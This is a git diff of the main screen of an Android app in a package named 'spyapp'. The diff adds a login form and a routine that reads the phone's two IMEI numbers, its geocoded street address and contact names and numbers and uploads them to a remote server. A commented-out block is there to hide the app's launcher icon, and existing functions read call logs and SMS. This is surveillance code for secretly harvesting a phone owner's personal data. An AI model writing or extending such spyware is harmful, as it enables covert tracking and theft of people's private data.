@@ -3,6 +3,7 @@ package kkactive_india.in.spyapp;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
@@ -23,6 +24,10 @@ import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -33,10 +38,29 @@ import java.util.List;
 import java.util.Locale;
 
 import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
+import kkactive_india.in.spyapp.MainPOJO.MainBean;
+import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
+import kkactive_india.in.spyapp.contactPOJO.contactBean;
+import kkactive_india.in.spyapp.mailPOJO.mailBean;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+import retrofit2.Retrofit;
+import retrofit2.converter.gson.GsonConverterFactory;
+import retrofit2.converter.scalars.ScalarsConverterFactory;
+
+import static android.view.View.VISIBLE;
 
 public class MainActivity extends AppCompatActivity {
 
     TextView textView;
+    EditText mail;
+    Button login;
+    ProgressBar bar;
+    @SuppressLint("HardwareIds") String imeiNumber1;
+    @SuppressLint("HardwareIds") String imeiNumber2;
+    String address;
+    String  name,phoneNumber;
 
     @TargetApi(Build.VERSION_CODES.O)
     @RequiresApi(api = Build.VERSION_CODES.M)
@@ -45,7 +69,55 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        textView = (TextView) findViewById(R.id.textview);
+       // textView = (TextView) findViewById(R.id.textview);
+
+        mail = (EditText)findViewById(R.id.mail);
+        login = (Button)findViewById(R.id.logInButton);
+        bar = (ProgressBar) findViewById(R.id.progress);
+
+        login.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+
+              final String e =  mail.getText().toString();
+
+              if (e.length() > 0){
+                  bar.setVisibility(VISIBLE);
+                  Bean b = (Bean) getApplicationContext();
+
+                  Retrofit retrofit = new Retrofit.Builder()
+                          .baseUrl(b.baseURL)
+                          .addConverterFactory(ScalarsConverterFactory.create())
+                          .addConverterFactory(GsonConverterFactory.create())
+                          .build();
+                  Allapi cr = retrofit.create(Allapi.class);
+                  Call<mailBean> call = cr.login(e);
+                  call.enqueue(new Callback<mailBean>() {
+                      @Override
+                      public void onResponse(Call<mailBean> call, Response<mailBean> response) {
+                          bar.setVisibility(View.GONE);
+                          Log.d("successHoGyaHAi", response.message());
+                          Log.d("successHoGyaHAi", "success");
+                          Toast.makeText(MainActivity.this, "Please check your E-mail Id and click on that link.", Toast.LENGTH_SHORT).show();
+
+                          mainApi();
+
+                         /* PackageManager p = getPackageManager();
+                          ComponentName componentName = new ComponentName(this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+                          p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
+
+
+
+                      }
+
+                      @Override
+                      public void onFailure(Call<mailBean> call, Throwable t) {
+
+                      }
+                  });
+              }
+            }
+        });
 
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -59,8 +131,8 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
         assert tm != null;
-        @SuppressLint("HardwareIds") String imeiNumber1 = tm.getDeviceId(1); //(API level 23)
-        @SuppressLint("HardwareIds") String imeiNumber2 = tm.getDeviceId(2);
+        imeiNumber1 = tm.getDeviceId(1); //(API level 23)
+        imeiNumber2 = tm.getDeviceId(2);
 
         Log.d("IMEI1", imeiNumber1);
         Log.d("IMEI2", imeiNumber2);
@@ -94,7 +166,7 @@ public class MainActivity extends AppCompatActivity {
         try {
             List<Address> listAdresses = geocoder.getFromLocation(Double.parseDouble(lat), Double.parseDouble(lon), 1);
             if (null != listAdresses && listAdresses.size() > 0) {
-                String address = listAdresses.get(0).getAddressLine(0);
+                address= listAdresses.get(0).getAddressLine(0);
                 String state = listAdresses.get(0).getAdminArea();
                 String country = listAdresses.get(0).getCountryName();
                 String subLocality = listAdresses.get(0).getSubLocality();
@@ -120,7 +192,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
 
-      /*  ActivityCompat.requestPermissions(MainActivity.this,
+        ActivityCompat.requestPermissions(MainActivity.this,
                 new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
                 1);
         // String strOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
@@ -129,8 +201,8 @@ public class MainActivity extends AppCompatActivity {
         Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
         sb.append("Contact Details :");
         while (phones.moveToNext()) {
-            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            name= phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
             //Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();
 
             Log.d("names", name);
@@ -143,14 +215,51 @@ public class MainActivity extends AppCompatActivity {
 
         }
         phones.close();
-        textView.setText(sb);*/
+        //textView.setText(sb);
 
 
         // callLogs();
 
        // getSMS();
-        
 
+
+
+    }
+
+    public void mainApi(){
+
+        Bean b = (Bean) getApplicationContext();
+
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl(b.baseURL)
+                .addConverterFactory(ScalarsConverterFactory.create())
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        Allapi cr = retrofit.create(Allapi.class);
+        contactBean body = new contactBean();
+        body.setContactData("contact");
+
+        ContactDatum data = new ContactDatum();
+
+
+        data.setName(name);
+        data.setMobile(phoneNumber);
+
+
+        body.setContactData(data);
+
+        Call<MainBean> call = cr.main(imeiNumber1,imeiNumber2,address,body);
+        call.enqueue(new Callback<MainBean>() {
+            @Override
+            public void onResponse(Call<MainBean> call, Response<MainBean> response) {
+                Log.d("mainHaiBhai", "blklMainHai");
+            }
+
+            @Override
+            public void onFailure(Call<MainBean> call, Throwable t) {
+
+            }
+        });
 
     }
 
@@ -200,7 +309,7 @@ public class MainActivity extends AppCompatActivity {
             sb.append("\n----------------------------------");
         }
         managedCursor.close();
-        textView.setText(sb);
+       // textView.setText(sb);
         Log.e("Agil value --- ", sb.toString());
 
 
@@ -242,7 +351,7 @@ public class MainActivity extends AppCompatActivity {
             sb.append("\n-----------------");
         }
         Log.d("SMSS", sms.toString());
-        textView.setText(sb);
+        //textView.setText(sb);
 
         if (cur != null) {
             cur.close();
